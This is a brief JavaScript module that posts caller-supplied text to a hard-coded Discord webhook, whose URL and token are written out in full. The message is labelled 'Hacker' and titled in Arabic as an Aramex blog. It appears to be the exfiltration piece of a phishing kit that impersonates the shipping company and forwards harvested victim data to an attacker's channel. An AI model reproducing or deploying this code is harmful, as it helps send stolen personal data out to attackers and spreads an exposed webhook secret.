import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1322460399915765811/uSkoMLplmNYktHvov-_MNIwO2T3UkrOGAQh01q5K23AGchaqGSZK2zw_rholSoGOWsAq",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
